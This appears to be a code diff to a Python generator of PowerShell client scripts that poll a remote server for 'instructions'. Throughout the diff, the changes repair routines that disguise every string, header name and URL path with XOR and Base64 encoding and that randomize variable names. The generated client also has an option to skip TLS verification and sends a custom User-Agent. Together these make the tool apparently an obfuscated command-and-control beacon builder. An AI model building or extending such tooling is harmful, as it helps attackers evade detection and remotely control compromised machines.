@@ -160,16 +160,25 @@ class ClientTemplateGenerator:
 
             # Convert to character codes with random formatting
             if len(encrypted) < 20:
-                # Short: inline character codes
+                # Short: inline character codes — wrap in $() so it's valid in ALL positions
+                # (hash key, cmdlet arg, throw, assignment)
                 codes = ",".join([str(c) for c in encrypted])
-                return f'(({codes})|ForEach-Object{{[char]($_ -bxor {xor_key})}})-join""'
+                return f'$((({codes})|ForEach-Object{{[char]($_ -bxor {xor_key})}})-join"")'
             else:
-                # Long: Base64 + XOR
+                # Long: Base64 + XOR — must call .ToCharArray() before piping to ForEach-Object
+                # because piping a string yields a single item, not characters
                 b64 = base64.b64encode(text.encode()).decode()
                 encrypted_b64 = ''.join([chr(ord(c) ^ xor_key) for c in b64])
                 encrypted_b64_encoded = base64.b64encode(encrypted_b64.encode('latin1')).decode()
-                return f'$([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(([Text.Encoding]::Latin1.GetString([Convert]::FromBase64String("{encrypted_b64_encoded}"))|ForEach-Object{{[char]([byte][char]$_ -bxor {xor_key})}})-join"")))'
+                return f'$([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(([Text.Encoding]::GetEncoding(28591).GetString([Convert]::FromBase64String("{encrypted_b64_encoded}")).ToCharArray()|ForEach-Object{{[char]([byte][char]$_ -bxor {xor_key})}})-join"")))'
     
+    def _obfuscate_key(self, text: str) -> str:
+        """Obfuscate a string for hashtable KEY position.
+        Always emits a $() subexpression so the parser never sees bare {scriptblock}
+        tokens inside @{...} regardless of the global obfuscation level."""
+        b64 = base64.b64encode(text.encode()).decode()
+        return f'$([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("{b64}")))'
+
     def _generate_header_comment(self) -> str:
         build_id = hashlib.sha256(f"{self.request.model_dump_json()}{datetime.now()}".encode()).hexdigest()[:16]
         
@@ -210,17 +219,22 @@ class ClientTemplateGenerator:
 
 [CmdletBinding()]
 param(
-  [string]{server_var} = {self._obfuscate_string(self.request.server_url)},
-  [string]{client_var} = {self._obfuscate_string(self.config.client_id_prefix)} + "-" + $env:COMPUTERNAME,
+  [string]$ServerBaseUrl = {self._obfuscate_string(self.request.server_url)},
+  [string]$ClientId = {self._obfuscate_string(self.config.client_id_prefix)} + "-" + $env:COMPUTERNAME,
   [ValidateSet('Poll','WebSocket')] [string]$Mode = 'Poll',
   [string]$ApiKey,
   [string]$EnrollToken,
   [string]$Username,
   [string]$Password,
-  [int]{interval_var} = {self.config.interval_seconds},
+  [int]$IntervalSec = {self.config.interval_seconds},
   [switch]$SkipTlsVerify{' = $true' if self.config.skip_tls_verify else ''},
-  [switch]{debug_var}{' = $true' if self.config.debug_mode else ''}
+  [switch]$DebugMode{' = $true' if self.config.debug_mode else ''}
 )
+
+{server_var} = $ServerBaseUrl
+{client_var} = $ClientId
+{interval_var} = $IntervalSec
+{debug_var} = [bool]$DebugMode
 
 # ------------- TLS Configuration (WinPS 5.1) -------------
 try {{
@@ -293,8 +307,8 @@ function {derive_func}([string]$ApiKey) {{
     $encInfo = [Text.Encoding]::UTF8.GetBytes({self._obfuscate_string("enc")})
     $macInfo = [Text.Encoding]::UTF8.GetBytes({self._obfuscate_string("mac")})
     
-    $encKey  = {hkdf_func} -IKM $ikm -Salt $salt -Info $encInfo -Len 32
-    $macKey  = {hkdf_func} -IKM $ikm -Salt $salt -Info $macInfo -Len 32
+    $encKey  = {hkdf_func} $ikm $salt $encInfo 32
+    $macKey  = {hkdf_func} $ikm $salt $macInfo 32
     
     if ({debug_var}) {{
       $sha256 = [System.Security.Cryptography.SHA256]::Create()
@@ -495,9 +509,9 @@ function {token_func} {{
   if ($ApiKey) {{
     try {{
       $headers = @{{
-        {self._obfuscate_string("Authorization")} = {self._obfuscate_string("ApiKey ")} + $ApiKey
-        {self._obfuscate_string("X-MCP-ClientId")} = $ClientId
-        {self._obfuscate_string("Content-Type")} = {self._obfuscate_string("application/json")}
+        {self._obfuscate_key("Authorization")} = {self._obfuscate_string("ApiKey ")} + $ApiKey
+        {self._obfuscate_key("X-MCP-ClientId")} = $ClientId
+        {self._obfuscate_key("Content-Type")} = {self._obfuscate_string("application/json")}
       }}
       
       $body = @{{ api_key = $ApiKey; client_id = $ClientId }}
@@ -622,7 +636,7 @@ if ($Mode -eq 'Poll') {{
       $pollCount++
       if ({debug_var}) {{ Write-Host ({self._obfuscate_string("[poll] #")} + $pollCount + {self._obfuscate_string(" - Checking for instructions...")}) }}
       
-      $headers = @{{ Authorization = {auth_header_var}; {self._obfuscate_string("User-Agent")} = {self._obfuscate_string(self.config.custom_user_agent)} }}
+      $headers = @{{ Authorization = {auth_header_var}; {self._obfuscate_key("User-Agent")} = {self._obfuscate_string(self.config.custom_user_agent)} }}
       $path = {self._obfuscate_string("/api/get-instruction?client_id=")} + [Uri]::EscapeDataString({client_var})
       $uri = ({server_var}.TrimEnd('/')) + $path
 
